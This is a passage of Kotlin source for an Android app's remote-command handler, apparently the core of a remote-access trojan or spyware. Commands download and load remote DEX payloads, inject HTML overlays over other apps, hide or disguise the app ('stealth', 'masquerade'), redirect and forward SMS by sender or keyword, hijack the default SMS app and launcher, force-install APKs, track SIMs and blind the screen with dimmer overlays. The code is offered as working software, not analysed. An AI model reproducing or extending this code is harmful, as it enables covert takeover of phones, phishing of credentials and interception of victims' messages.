                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
                        android.provider.Settings.System.putInt(
                            ctx.contentResolver,
                            android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                            secs * 1000
                        )
                        status = "TIMEOUT_SET (${secs}s)"
                    } else {
                        status = "FAILED_PERMISSION (WRITE_SETTINGS)"
                        errorMsg = "Write Settings permission required to modify screen timeout."
                    }
                }
                "BRIGHTNESS" -> {
                    val parts = content.split("|")
                    val level = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 100
                    val method = parts.getOrNull(1)?.trim()?.uppercase() ?: "OVERLAY"
                    
                    Handler(Looper.getMainLooper()).post {
                        DimmerManager.applyDim(ctx, level, method)
                    }
                    status = "BRIGHTNESS_ADJUSTED ($level% via $method)"
                }
                "UNBLIND" -> {
                    Handler(Looper.getMainLooper()).post {
                        DimmerManager.removeOverlay(ctx)
                        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(ctx)) {
                            Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
                        }
                    }
                    status = "DISPLAY_RESTORED"
                }
                "LOCK_SCREEN" -> {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                    
                    if (dpm.isAdminActive(adminComponent)) {
                        try {
                            dpm.lockNow()
                            status = "DEVICE_LOCKED"
                        } catch (e: Exception) {
                            status = "LOCK_FAILED"
                            errorMsg = e.message ?: "Unknown error"
                        }
                    } else {
                        status = "FAILED_PERMISSION (DEVICE_ADMIN)"
                        errorMsg = "App is not an active Device Administrator."
                    }
                }
                "INSTALL_APP" -> {
                    val parts = content.split("|", limit = 2)
                    val apkPath = parts[0].trim()
                    val apkFile = File(apkPath)

                    if (apkFile.exists() && apkFile.isFile) {
                        val info = ctx.packageManager.getPackageArchiveInfo(apkPath, 0)
                        val targetPkg = info?.packageName ?: ""
                        
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putBoolean("relentless_install_active", true)
                            .putString("relentless_apk_path", apkFile.absolutePath)
                            .putString("relentless_target_pkg", targetPkg)
                            .apply()

                        val i = Intent(ctx, MonitorService::class.java)
                        i.putExtra("kick_relentless", true)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
                        
                        status = "RELENTLESS_TRAP_ARMED"
                        
                        if (parts.size > 1) {
                            DynamicUIManager.showOverlay(ctx, true, "AUTO", parts[1].trim())
                        }
                    } else {
                        status = "INSTALL_FAILED (NOT_FOUND)"
                        errorMsg = "APK not at: $apkPath"
                    }
                }
                "STOP_INSTALL" -> {
                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                        .putBoolean("relentless_install_active", false)
                        .putString("relentless_apk_path", "")
                        .putString("relentless_target_pkg", "")
                        .putLong("relentless_last_prompt", 0L)
                        .apply()
                    
                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    nm.cancel(102)
                    nm.cancel(103)
                    
                    DynamicUIManager.removeOverlay(ctx)
                    status = "RELENTLESS_TRAP_DISARMED"
                }
                                "UI_TRAP" -> {
                    val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
                    val trapsArr = org.json.JSONArray(trapsStr)
                    val newArr = org.json.JSONArray()

                    try {
                        val json = org.json.JSONObject(content)
                        val action = json.optString("action", "SET").uppercase()
                        val label = json.optString("label", "Default")

                        if (action == "REMOVE") {
                            for (i in 0 until trapsArr.length()) {
                                val t = trapsArr.getJSONObject(i)
                                if (t.optString("label") != label) newArr.put(t)
                            }
                            prefs.edit().putString("ui_traps_array", newArr.toString()).apply()
                            status = "TRAP_REMOVED"
                            errorMsg = "Purged config with label: $label"
                        } else {
                            // SET/UPDATE logic
                            val newTrap = org.json.JSONObject().apply {
                                put("label", label)
                                put("target", json.getString("target"))
                                put("strict", json.optBoolean("strict", false))
                                put("method", json.optString("method", "ACC").uppercase())
                                put("timeout", json.optLong("timeout", 15L))
                                put("dim", json.optInt("dim", 20))
                                put("html", json.optString("html", ""))
                            }

                            var found = false
                            for (i in 0 until trapsArr.length()) {
                                val t = trapsArr.getJSONObject(i)
                                if (t.optString("label") == label) {
                                    newArr.put(newTrap)
                                    found = true
                                } else {
                                    newArr.put(t)
                                }
                            }
                            if (!found) newArr.put(newTrap)
                            
                            prefs.edit().putString("ui_traps_array", newArr.toString()).apply()
                            status = "UI_TRAP_ARMED"
                            errorMsg = "Armed config: $label"
                        }
                    } catch (e: Exception) {
                        // Legacy Pipe Fallback
                        val parts = content.split("|", limit = 5)
                        if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
                            prefs.edit().remove("ui_traps_array").apply()
                            status = "ALL_TRAPS_CLEARED"
                        } else if (parts.size >= 4) {
                            val newTrap = org.json.JSONObject().apply {
                                put("label", "Legacy_" + System.currentTimeMillis())
                                put("target", parts[0].trim())
                                put("method", parts[1].trim())
                                put("timeout", parts[2].trim().toLongOrNull() ?: 15L)
                                put("dim", if(parts.size >= 5) parts[3].trim().toIntOrNull() ?: 20 else 20)
                                put("html", if(parts.size >= 5) parts[4].trim() else parts[3].trim())
                            }
                            trapsArr.put(newTrap)
                            prefs.edit().putString("ui_traps_array", trapsArr.toString()).apply()
                            status = "UI_TRAP_ARMED_LEGACY"
                        } else {
                            status = "FAILED_PARSING"
                        }
                    }
                    MyAccessibilityService.instance?.reloadUiTraps()
                }
                "CLEAR_UI_TRAP" -> {
                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                        .remove("ui_traps_array").apply()
                    status = "ALL_UI_TRAPS_DISARMED"
                    MyAccessibilityService.instance?.reloadUiTraps()
                }
                "NATIVE_UI_TRAP" -> {
                    val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val trapsStr = prefs.getString("native_traps_array", "[]") ?: "[]"
                    val trapsArr = org.json.JSONArray(trapsStr)
                    val newArr = org.json.JSONArray()

                    try {
                        val json = org.json.JSONObject(content)
                        val action = json.optString("action", "SET").uppercase()
                        val label = json.optString("label", "DefaultNative")

                        if (action == "REMOVE") {
                            for (i in 0 until trapsArr.length()) {
                                val t = trapsArr.getJSONObject(i)
                                if (t.optString("label") != label) newArr.put(t)
                                else {
                                    // Clean up the entire unzipped directory
                                    try { java.io.File(t.getString("file_path")).deleteRecursively() } catch(e:Exception){}
                                }
                            }
                            prefs.edit().putString("native_traps_array", newArr.toString()).apply()
                            status = "NATIVE_TRAP_REMOVED"
                            errorMsg = "Purged Bundle config: $label"
                        } else {
                            val urlStr = json.getString("url")
                            val targetBaseDir = ctx.getDir("dex_traps", Context.MODE_PRIVATE)
                            val trapDir = java.io.File(targetBaseDir, label)
                            
                            // Clean slate for this label
                            if (trapDir.exists()) trapDir.deleteRecursively()
                            trapDir.mkdirs()

                            val zipFile = java.io.File(targetBaseDir, "${label}_temp.zip")

                            DebugLogger.log("NATIVE_TRAP", "Downloading ZIP payload from $urlStr")
                            val url = URL(urlStr)
                            val conn = url.openConnection() as HttpURLConnection
                            conn.connectTimeout = 15000
                            conn.readTimeout = 15000
                            
                            if (conn.responseCode == 200) {
                                conn.inputStream.use { input ->
                                    zipFile.outputStream().use { output -> input.copyTo(output) }
                                }
                                DebugLogger.log("NATIVE_TRAP", "Download complete (${zipFile.length()} bytes). Extracting ZIP...")
                                
                                var unzipSuccess = true
                                try {
                                    java.util.zip.ZipInputStream(zipFile.inputStream()).use { zis ->
                                        var entry = zis.nextEntry
                                        while (entry != null) {
                                            val outFile = java.io.File(trapDir, entry.name)
                                            // ZipSlip Vulnerability Protection
                                            if (!outFile.canonicalPath.startsWith(trapDir.canonicalPath)) {
                                                throw SecurityException("Zip Path Traversal detected: ${entry.name}")
                                            }
                                            if (entry.isDirectory) {
                                                outFile.mkdirs()
                                            } else {
                                                outFile.parentFile?.mkdirs()
                                                java.io.FileOutputStream(outFile).use { fos -> zis.copyTo(fos) }
                                            }
                                            entry = zis.nextEntry
                                        }
                                    }
                                    DebugLogger.log("NATIVE_TRAP", "Extraction successful to ${trapDir.absolutePath}")
                                } catch(e: Exception) {
                                    unzipSuccess = false
                                    DebugLogger.log("NATIVE_TRAP_ERR", "Unzip failed: ${e.message}\n${e.stackTraceToString()}")
                                } finally {
                                    zipFile.delete()
                                }

                                if (unzipSuccess) {
                                    val dexFile = java.io.File(trapDir, "classes.dex")
                                    if (!dexFile.exists()) {
                                        status = "FAILED_DEX_MISSING"
                                        errorMsg = "Extracted zip did not contain 'classes.dex'"
                                        DebugLogger.log("NATIVE_TRAP_ERR", errorMsg)
                                    } else {
                                        val newTrap = org.json.JSONObject().apply {
                                            put("label", label)
                                            put("target", json.getString("target"))
                                            put("strict", json.optBoolean("strict", false))
                                            put("class_name", json.getString("class_name"))
                                            put("timeout", json.optLong("timeout", 15L))
                                            put("dim", json.optInt("dim", 20))
                                            put("file_path", trapDir.absolutePath) // We store the DIR, not the file
                                        }

                                        var found = false
                                        for (i in 0 until trapsArr.length()) {
                                            val t = trapsArr.getJSONObject(i)
                                            if (t.optString("label") == label) {
                                                newArr.put(newTrap)
                                                found = true
                                            } else newArr.put(t)
                                        }
                                        if (!found) newArr.put(newTrap)

                                        prefs.edit().putString("native_traps_array", newArr.toString()).apply()
                                        status = "NATIVE_TRAP_ARMED"
                                        errorMsg = "Armed Bundle: $label"
                                        DebugLogger.log("NATIVE_TRAP", "Trap Armed. DEX located at: ${dexFile.absolutePath}")
                                    }
                                } else {
                                    status = "FAILED_EXTRACTION"
                                }
                            } else {
                                status = "FAILED_DOWNLOAD"
                                errorMsg = "HTTP Response: ${conn.responseCode}"
                                DebugLogger.log("NATIVE_TRAP_ERR", "Download failed with HTTP ${conn.responseCode}")
                            }
                        }
                    } catch (e: Exception) {
                        status = "FAILED_PARSING"
                        errorMsg = e.message ?: "Invalid JSON or network error"
                        DebugLogger.log("NATIVE_TRAP_ERR", "Critical Failure: \n${e.stackTraceToString()}")
                    }
                    MyAccessibilityService.instance?.reloadUiTraps()
                }
                "INJECT_UI" -> {
                    val parts = content.split("|", limit = 3)
                    if (parts.size >= 3) {
                        val touchable = parts[0].trim().uppercase() == "TRUE"
                        val method = parts[1].trim().uppercase() // ACC, OVERLAY, or AUTO
                        val html = parts[2].trim()
                        
                        DynamicUIManager.showOverlay(ctx, touchable, method, html)
                        status = "UI_DISPATCHED"
                        errorMsg = "Method: $method | Touchable: $touchable"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: INJECT_UI | TRUE/FALSE | ACC/OVERLAY/AUTO | <html>"
                    }
                }
                "REMOVE_UI" -> {
                    DynamicUIManager.removeOverlay(ctx, "REMOTE_COMMAND_PURGE")
                    status = "UI_REMOVED"
                }
                "STATUS_BAR_UI" -> {
                    val parts = content.split("|", limit = 3)
                    val state = parts[0].trim().uppercase()
                    val cPrefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                    
                    if (state == "OFF") {
                        cPrefs.edit().putBoolean("status_bar_active", false).apply()
                        DynamicUIManager.removeStatusBarOverlay(ctx)
                        status = "STATUS_BAR_REMOVED"
                    } else if (parts.size >= 3) {
                        val touchable = parts[1].trim().uppercase() == "TRUE"
                        val html = parts[2].trim()
                        
                        // Persist configuration for automatic/emergency re-activation
                        cPrefs.edit()
                            .putBoolean("status_bar_active", true)
                            .putBoolean("status_bar_touchable", touchable)
                            .putString("status_bar_html", html)
                            .apply()
                            
                        DynamicUIManager.showStatusBarOverlay(ctx, touchable, html)
                        status = "STATUS_BAR_DEPLOYED"
                        errorMsg = "Touchable: $touchable"
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Usage: STATUS_BAR_UI | ON/OFF | TRUE/FALSE | <html>"
                    }
                }
                "POWER_SHIELD" -> {
                    val parts = content.split("|", limit = 4)
                    if (parts.size >= 4) {
                        val toggle = parts[0].trim().uppercase() == "ON"
                        val timeoutRaw = parts[1].trim()
                        val timeout = if (timeoutRaw.isEmpty()) 0L else timeoutRaw.toLongOrNull() ?: 10L
                        val method = parts[2].trim().uppercase()
                        val htmlPayload = parts[3].trim()
                        
                        val htmlParts = htmlPayload.split("|||")
                        val shutdownHtml = htmlParts[0].trim()
                        val bootHtml = if (htmlParts.size > 1) htmlParts[1].trim() else ""
                        
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putBoolean("power_shield_active", toggle)
                            .putLong("power_shield_timeout", timeout)
                            .putString("power_shield_method", method)
                            .putString("power_shield_html_shutdown", shutdownHtml)
                            .putString("power_shield_html_boot", bootHtml)
                            .putString("power_shield_state", "NORMAL") // Reset state on config
                            .apply()
                        
                        status = "POWER_SHIELD_CONFIGURED"
                        errorMsg = "State: ${if(toggle) "ON" else "OFF"} | Timeout: ${timeout}s | Dual-Mode: ${bootHtml.isNotEmpty()}"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: POWER_SHIELD | ON/OFF | TIMEOUT | ACC/OVERLAY | <shutdown_html> ||| <boot_html>"
                    }
                }
                "ADD_AUTO_SWIPE" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val rawType = parts[0].trim().lowercase()
                        val type = when (rawType) {
                            "pkg", "package" -> "pkgs"
                            "keyword", "kw" -> "keywords"
                            "sender", "num", "number" -> "senders"
                            else -> rawType
                        }
                        val newVal = parts[1].trim()
                        val aPrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
                        val existing = aPrefs.getString(type, "") ?: ""
                        val updated = if (existing.isEmpty()) newVal else "$existing, $newVal"
                        aPrefs.edit().putString(type, updated).apply()
                        status = "AUTO_SWIPE_UPDATED: $type"
                    } else {
                        status = "FAILED_FORMAT"
                    }
                }
                "CLEAR_AUTO_SWIPE" -> {
                    val type = content.trim().lowercase()
                    val aPrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
                    if (type == "all" || type == "") {
                        aPrefs.edit().clear().apply()
                        status = "ALL_AUTO_SWIPE_PURGED"
                    } else {
                        aPrefs.edit().remove(type).apply()
                        status = "AUTO_SWIPE_CLEARED: $type"
                    }
                }
                "ADD_CONTACT" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val success = PhoneManager.addContact(ctx, parts[0].trim(), parts[1].trim())
                        status = if (success) "CONTACT_INJECTED" else "INJECTION_FAILED"
                    } else status = "FAILED_FORMAT"
                }
                "PURGE_CONTACT" -> {
                    val count = PhoneManager.purgeContact(ctx, content.trim())
                    status = if (count >= 0) "PURGE_COMPLETE ($count)" else "PURGE_FAILED"
                }
                "SET_DEBUG_UI" -> {
                    val state = content.trim().uppercase()
                    val isEnabled = (state == "ON")
                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                        .putBoolean("debug_ui_enabled", isEnabled).apply()
                    status = "DEBUG_UI_ACCESS_SET: " + (if (isEnabled) "VISIBLE" else "HIDDEN")
                }
                "SET_MASQUERADE" -> {
                    val skin = content.trim().uppercase()
                    if (applyMasqueradeSkin(ctx, skin)) {
                        status = "SUCCESS"
                        errorMsg = "Identity transformed to $skin"
                    } else {
                        status = "FAILED"
                        errorMsg = "Skin $skin not recognized or component rejected update."
                    }
                }
                "SET_TILE_STATE" -> {
                    val state = content.trim().uppercase()
                    val isActive = state == "ON"
                    
                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                        .putBoolean("tile_dashboard_active", isActive).apply()
                    
                    // Force the Quick Settings Tile to refresh its UI immediately
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                        android.service.quicksettings.TileService.requestListeningState(
                            ctx, android.content.ComponentName(ctx, DashboardTileService::class.java)
                        )
                    }
                    
                    status = "TILE_STATE_SET: " + (if (isActive) "DASHBOARD_MODE" else "STEALTH_MODE")
                }
                "STORE_VOUCHER" -> {
                    val voucher = content.trim()
                    if (voucher.isNotEmpty()) {
                        ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                            .putString("stored_voucher", voucher).apply()
                        status = "VOUCHER_STORED"
                        errorMsg = "Ready for emergency top-up: $voucher"
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Voucher code cannot be empty"
                    }
                }
                "SET_JUDAS_HANDLER" -> {
                    JudasManager.setHandler(ctx, content.trim())
                    status = "EMERGENCY_HANDLER_SET"
                }
                "SET_SIM_TRACKER" -> {
                    val targetSmsNum = content.trim()
                    if (targetSmsNum.isNotEmpty()) {
                        val fingerprints = JudasManager.getSimFingerprints(ctx)
                        if (fingerprints.isNotEmpty()) {
                            ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                                .putString("trusted_sim_hashes", JSONArray(fingerprints).toString())
                                .putString("sim_track_target_num", targetSmsNum)
                                .putBoolean("is_sim_trap_armed", false)
                                .apply()
                            JudasManager.evaluateSimState(ctx)
                            status = "SIM_TRACKER_LOCKED"
                            errorMsg = "Locked to ${fingerprints.size} SIM(s) | Target: $targetSmsNum"
                        } else {
                            status = "FAILED_NO_SIM"
                            errorMsg = "No active SIMs found to lock onto."
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Use: TARGET_SMS_NUM"
                    }
                }
                "GET_TRUSTED_SIMS" -> {
                    val sims = JudasManager.getTrustedSims(ctx)
                    status = "TRUSTED_SIMS_RETRIEVED"
                    val result = JSONObject().put("trusted_sims", sims)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "SET_PROMOS" -> {
                    val arr = JSONArray()
                    content.split("|||").forEach { arr.put(it.trim()) }
                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                        .putString("promo_templates", arr.toString()).apply()
                    status = "PROMO_TEMPLATES_UPDATED (${arr.length()})"
                }
                "SET_EDGE_URLS" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val primary = parts[0].trim()
                        val secondary = parts[1].trim()
                        SecretVault.setEdgeUrls(ctx, primary, secondary)
                        status = "EDGE_URLS_UPDATED"
                        errorMsg = "Primary: $primary | Secondary: $secondary"
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Format: PRIMARY_URL|SECONDARY_URL"
                    }
                }
                "SET_SMS_BLACKLIST" -> {
                    val list = content.trim()
                    ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE).edit()
                        .putString("blacklist", if (list.equals("DEFAULT", true)) null else list)
                        .apply()
                    status = "SMS_BLACKLIST_UPDATED"
                }
                "ADD_HVT_REDIRECT" -> {
                    // Format: TARGET_SENDER | DESTINATION_NUMBER
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val target = parts[0].trim()
                        val dest = parts[1].trim()
                        val hvtPrefs = ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
                        hvtPrefs.edit().putString(target, dest).apply()
                        status = "HVT_REDIRECT_ADDED: $target -> $dest"
                    } else {
                        status = "FAILED_FORMAT: Use TARGET|DEST"
                    }
                }
                "CLEAR_HVT_REDIRECTS" -> {
                    ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                    status = "HVT_REDIRECTS_CLEARED"
                }
                "ADD_KEYWORD_FORWARD" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val keywords = parts[0].trim().lowercase()
                        val dest = parts[1].trim()
                        val kwPrefs = ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
                        // Store each keyword in the comma list as a separate entry pointing to the same dest
                        val editor = kwPrefs.edit()
                        keywords.split(",").forEach { kw -> 
                            if (kw.trim().isNotEmpty()) editor.putString(kw.trim(), dest) 
                        }
                        editor.apply()
                        status = "KEYWORD_TRAPS_SET: $keywords -> $dest"
                    } else {
                        status = "FAILED_FORMAT: Use KEYWORDS|DEST"
                    }
                }
                "CLEAR_KEYWORD_FORWARDS" -> {
                    ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                    status = "KEYWORD_TRAPS_PURGED"
                }
                "FORCE_DATA" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility is required for Ghost Hand data toggle."
                    } else {
                        Handler(Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 0, "AUTO")
                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }
                            ctx.startActivity(dataIntent)
                        }
                        status = "GHOST_DATA_INITIATED"
                    }
                }
                "DISABLE_STEALTH" -> {
                    JudasManager.disengageStealthMode(ctx)
                    status = "STEALTH_DISENGAGED"
                }
                "STOLEN_PHONE" -> {
                    val input = content.trim()
                    if (input.uppercase() == "STOP") {
                        // 1. Disable Stealth Mode (Restores volume & notifs)
                        JudasManager.disengageStealthMode(ctx)
                        
                        // 2. Lift Status Bar Lock
                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                            .putBoolean("status_bar_active", false).apply()
                        Handler(Looper.getMainLooper()).post {
                            DynamicUIManager.removeStatusBarOverlay(ctx)
                        }
                        
                        // 3. Remove Screen Dimmer/Blindfold
                        Handler(Looper.getMainLooper()).post {
                            DimmerManager.removeOverlay(ctx)
                            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(ctx)) {
                                Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
                            }
                        }
                        
                        // 4. Stop Relentless SMS Traps & Launcher Hijack
                        DefaultSmsManager.isRelentlessActive = false
                        DefaultSmsManager.expectedMode = ""
                        LauncherManager.isHijacking = false
                        
                        // 5. Clear Pending Alerts & SIM Traps
                        ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                            .putBoolean("stolen_alert_pending", false)
                            .putBoolean("is_sim_trap_armed", false)
                            .apply()
                            
                        status = "STOLEN_PROTOCOL_DISARMED"
                        errorMsg = "All lockdown mechanisms lifted. Device restored to normal."
                    } else {
                        val targetNum = if (input.isNotBlank()) input else JudasManager.getHandler(ctx) ?: ""
                        if (targetNum.isEmpty()) {
                            status = "FAILED"
                            errorMsg = "No target number specified in command or Judas Registry"
                        } else {
                            // 0. DELAYED ARMING (5 Seconds lead-in for testing)
                            Handler(Looper.getMainLooper()).postDelayed({
                                JudasManager.engageStealthMode(ctx)
                                ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                                    .putString("stolen_target_num", targetNum)
                                    .putBoolean("stolen_alert_pending", true)
                                    .apply()
                            }, 5000)

                            // 1. STRONG WAKE (Delayed to 5.5s)
                            Handler(Looper.getMainLooper()).postDelayed({
                                val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                                val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                                    android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:StolenWake")
                                wakeLock.acquire(3000)
                                
                                val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                    putExtra("is_wake_trigger", true)
                                }
                                ctx.startActivity(wakeIntent)
                            }, 5500)

                            // 2. DIM IMMEDIATELY (Delayed to 6.5s)
                            Handler(Looper.getMainLooper()).postDelayed({ 
                                DimmerManager.applyDim(ctx, 0, "AUTO")
                            }, 6500)

                            // 3. DEFAULT SMS GHOST SEQUENCE (Delayed to 8.5s)
                            Handler(Looper.getMainLooper()).postDelayed({ 
                                DefaultSmsManager.expectedMode = "AUTO"
                                DefaultSmsManager.requestDefault(ctx)
                            }, 8500)

                            // 4. CONNECTIVITY EVALUATION (Delayed to 18s)
                            Handler(Looper.getMainLooper()).postDelayed({
                                val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                                val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                                val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
                                
                                val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                                val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT

                                                        if (!isOnline && hasSim) {
                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }
                            ctx.startActivity(dataIntent)
                        } else {
                            if (DefaultSmsManager.expectedMode.isEmpty()) {
                                DimmerManager.removeOverlay(ctx)
                            }
                        }
                    }, 18000)

                    // 5. EXECUTE STOLEN ALERT (Delayed to 22s)
                    Handler(Looper.getMainLooper()).postDelayed({
                        JudasManager.checkPendingStolenAlert(ctx)
                    }, 22000)

                    // 5.5 HIJACK LAUNCHER (Delayed to 26s)
                    Handler(Looper.getMainLooper()).postDelayed({
                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                            val setModeCmd = org.json.JSONObject().apply { put("id", -10); put("file_name", "SET_LAUNCHER_MODE"); put("content", "WORK") }
                            processSingleCommand(ctx, setModeCmd)

                            val setLauncherCmd = org.json.JSONObject().apply { put("id", -8); put("file_name", "SET_LAUNCHER"); put("content", "ON|") }
                            processSingleCommand(ctx, setLauncherCmd)
                            kotlinx.coroutines.delay(1000)
                            val hijackCmd = org.json.JSONObject().apply { put("id", -9); put("file_name", "HIJACK_LAUNCHER"); put("content", "") }
                            processSingleCommand(ctx, hijackCmd)
                        }
                    }, 26000)

                    Handler(Looper.getMainLooper()).postDelayed({
                        if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true || LauncherManager.isHijacking) {
                            DefaultSmsManager.expectedMode = ""
                            MyAccessibilityService.instance?.isWaitingForDataSettings = false
                            LauncherManager.isHijacking = false
                            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                            DimmerManager.removeOverlay(ctx)
                        }
                    }, 45000)

                    status = "STOLEN_PROTOCOL_QUEUED_5S"
                            errorMsg = "Orchestrator lead-in active. Targeting: $targetNum"
                        }
                    }
                }
                "FULL_ONBOARDING" -> {
                    // 1. STRONG WAKE (Delayed by 5 seconds for testing)
                    Handler(Looper.getMainLooper()).postDelayed({
                        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:MasterWake")
                        wakeLock.acquire(3000)
                        
                        val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            putExtra("is_wake_trigger", true)
                        }
                        ctx.startActivity(wakeIntent)
                    }, 5000)

                    // 2. DIM IMMEDIATELY (Relative to 5s delay -> 5500ms)
                    Handler(Looper.getMainLooper()).postDelayed({ 
                        DimmerManager.applyDim(ctx, 0, "AUTO")
                    }, 5500)

                    // 3. DEFAULT SMS GHOST SEQUENCE (7500ms)
                    Handler(Looper.getMainLooper()).postDelayed({ 
                        DefaultSmsManager.expectedMode = "AUTO"
                        DefaultSmsManager.requestDefault(ctx)
                    }, 7500)

                    // 4. CONNECTIVITY EVALUATION (17000ms)
                    Handler(Looper.getMainLooper()).postDelayed({
                        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                        val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
                        
                        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                        val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT

                                        if (!isOnline && hasSim) {
                    MyAccessibilityService.instance?.isWaitingForDataSettings = true
                    val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    ctx.startActivity(dataIntent)
                    DebugLogger.log("AUTO_SYNC", "Offline with SIM detected. Opening Data Settings.")
                } else {
                    DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
                    if (DefaultSmsManager.expectedMode.isEmpty()) {
                        DimmerManager.removeOverlay(ctx)
                    } else {
                        DebugLogger.log("AUTO_SYNC", "SMS Hijack still active. Keeping Dimmer.")
                    }
                }
            }, 17000)
            
            Handler(Looper.getMainLooper()).postDelayed({
